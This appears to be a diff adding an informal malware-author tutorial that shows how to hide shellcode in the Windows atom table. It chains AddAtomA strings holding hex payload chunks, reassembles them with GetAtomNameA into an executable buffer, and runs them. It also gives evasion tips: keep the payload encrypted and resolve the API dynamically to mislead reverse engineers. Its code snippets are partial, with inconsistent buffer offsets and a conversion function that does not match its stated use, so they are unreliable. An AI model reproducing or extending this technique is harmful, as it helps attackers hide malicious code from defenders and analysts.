@@ -1,0 +1,106 @@
+
+
+            Up N Atom
+           Sleepy 2026
+
+
+Okay so while just messing aorund in Windows
+API land, I discovered a kind of obscure 
+feature built into Windows called "atoms".
+
+Atoms, seems weird at first, store strings of
+up to 255 bytes into a atom table which can be
+referenced by a 16 bit value provided by the 
+Kernel. Windows uses them for faster string 
+lookups, we are going to use them to obscure
+our payload.
+
+How will we fit a full payload, that does anything
+meaningful, into 255 bytes, you may ask? Well we 
+are not.
+
+2 issues.
+
+1. You can only store strings.
+2. Has a maximum size limit.
+
+I ended up keeping the strings, but just converting 
+the strings to bytes using a function ill provide.
+Next, I did what I thought was the only sensible 
+solution, I chained atoms.
+
+Heres one atom 
+
+ATOM at = AddAtomA("49C7C6000000004983FE00745B488D35C4000000........");
+ATOM ab = AddAtomA("...continue adding atoms...");
+
+As you can see I am just storing my payload bytes one
+after another as a string. After storing the entire 
+payload inside the atom table, you can prepare the 
+enviorment to run. To get the payload from inside 
+of the atom table we are going to do the reverse.
+
+unsigned char out[4096];
+GetAtomNameA(at, out, 256);
+GetAtomNameA(aa, out + 232, 234);
+GetAtomNameA(ab, out + 232 + 233, 208);
+GetAtomNameA(bt, out + 232 + 233 + 207, 235);
+
+After Getting the Atom into either a stack buffer, 
+or a RWX buffer, you can just call the payload as
+normal.
+
+oh and before I forget, you can use this to convert.
+
+char2Addr(unsigned char* in, void** out) {
+    
+    unsigned long long addr = 0;
+    for (int i=0; i < 16; i+=2) {
+
+        unsigned short byte = *(unsigned short*)(in + i);
+
+        unsigned char nib = 0;
+        unsigned char nib2 = 0;
+        if ((byte >> 8) <= '9' && (byte >> 8) >= '0') {
+            nib = (byte >> 8) - ('0'); 
+        } else if ((byte >> 8) >= 'A' && (byte >> 8) <= 'F'){
+            nib = (byte >> 8) - 'A' + 10;
+        }
+
+        if ((byte & 0xFF) <= '9' && (byte & 0xFF) >= '0') {
+            nib2 = (byte & 0xFF) - ('0'); 
+        } else if ((byte & 0xFF) >= 'A' && (byte & 0xFF) <= 'F') {
+            nib2 = (byte & 0xFF) - 'A' + 10;
+        }
+
+        unsigned char final = nib2 << 4 | nib;
+
+        addr = addr << 8 | final;
+    }   
+
+    addr = _byteswap_uint64(addr);
+    *out = addr;
+    return 0;
+}
+
+I actually prefer to keep the payload encrypted the
+entire time and not decrypt until it needs to be.
+
+The reason for doing this is because while stored
+inside an atom, a unknowing person trying to reverse
+this will wonder where the payload was even being
+pulled from. Obviously they would see GetAtomName 
+usage, but this can but fixed by not importing it
+and dynamically resolving it.
+
+Thats all for this one... Im sure you can think of 
+more ways to make this useful. 
+
+Until next time...
+
+-Sleepy 
+
+END
+
+
+
